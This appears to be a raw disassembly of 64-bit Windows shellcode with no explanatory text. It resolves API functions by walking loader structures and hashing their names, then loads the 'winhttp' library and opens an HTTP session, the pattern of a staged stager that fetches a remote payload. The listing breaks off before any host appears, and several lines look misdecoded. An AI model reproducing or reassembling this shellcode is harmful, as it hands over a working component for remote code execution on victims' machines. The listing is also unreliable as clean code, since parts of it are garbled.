0: cld 
1: and rsp, 0xfffffffffffffff0
5: call 0xd6
10: push r9
12: push r8
14: push rdx
15: xor rdx, rdx
18: mov rdx, qword ptr gs:[rdx + 0x60]
23: push rcx
24: mov rdx, qword ptr [rdx + 0x18]
28: mov rdx, qword ptr [rdx + 0x20]
32: push rsi
33: mov rsi, qword ptr [rdx + 0x50]
37: xor r9, r9
40: movzx rcx, word ptr [rdx + 0x4a]
45: xor rax, rax
48: lodsb al, byte ptr [rsi]
49: cmp al, 0x61
51: jl 0x37
53: sub al, 0x20
55: ror r9d, 0xd
59: add r9d, eax
62: loop 0x2d
64: push rdx
65: mov rdx, qword ptr [rdx + 0x20]
69: mov eax, dword ptr [rdx + 0x3c]
72: add rax, rdx
75: push r9
77: cmp word ptr [rax + 0x18], 0x20b
83: jne 0xcb
89: mov eax, dword ptr [rax + 0x88]
95: test rax, rax
98: je 0xcb
100: add rax, rdx
103: push rax
104: mov r8d, dword ptr [rax + 0x20]
108: add r8, rdx
111: mov ecx, dword ptr [rax + 0x18]
114: jrcxz 0xca
116: dec rcx
119: mov esi, dword ptr [r8 + rcx*4]
123: xor r9, r9
126: add rsi, rdx
129: xor rax, rax
132: ror r9d, 0xd
136: lodsb al, byte ptr [rsi]
137: add r9d, eax
140: cmp al, ah
142: jne 0x81
144: add r9, qword ptr [rsp + 8]
149: cmp r9d, r10d
152: jne 0x72
154: pop rax
155: mov r8d, dword ptr [rax + 0x24]
159: add r8, rdx
162: mov cx, word ptr [r8 + rcx*2]
167: mov r8d, dword ptr [rax + 0x1c]
171: add r8, rdx
174: mov eax, dword ptr [r8 + rcx*4]
178: pop r8
180: pop r8
182: pop rsi
183: pop rcx
184: add rax, rdx
187: pop rdx
188: pop r8
190: pop r9
192: pop r10
194: sub rsp, 0x20
198: push r10
200: jmp rax
202: pop rax
203: pop r9
205: pop rdx
206: mov rdx, qword ptr [rdx]
209: jmp 0x21
214: pop rbp
215: xor rbx, rbx
218: mov eax, gs
220: imul esp, ebp, 0x8e89e8ab
226: push rbx
227: movabs r14, 0x707474686e6977
237: push r14
239: mov rcx, rsp
242: mov r10, 0x726774c
249: call rbp
251: push rbx
252: push rbx
253: mov rcx, rsp
256: push rbx
257: pop rdx
258: xor r8, r8
261: xor r9, r9
264: push rbx
265: push rbx
266: movabs r10, 0xbb9d1f04
276: call rbp
278: mov r12, rax
281: call 0x132
286: xor dword ptr [rax], eax
288: xor al, byte ptr [rax]
